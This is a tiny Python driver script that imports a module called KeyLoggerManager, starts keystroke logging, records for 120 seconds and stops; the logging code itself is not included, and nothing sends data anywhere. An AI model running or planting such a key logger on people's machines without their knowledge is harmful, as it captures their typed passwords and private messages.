import KeyLoggerManager as km
import time


def main():
    track = km.KeyLoggerManager()
    track.start()
    time.sleep(120)
    track.stop()

if __name__ == "__main__":
    main()



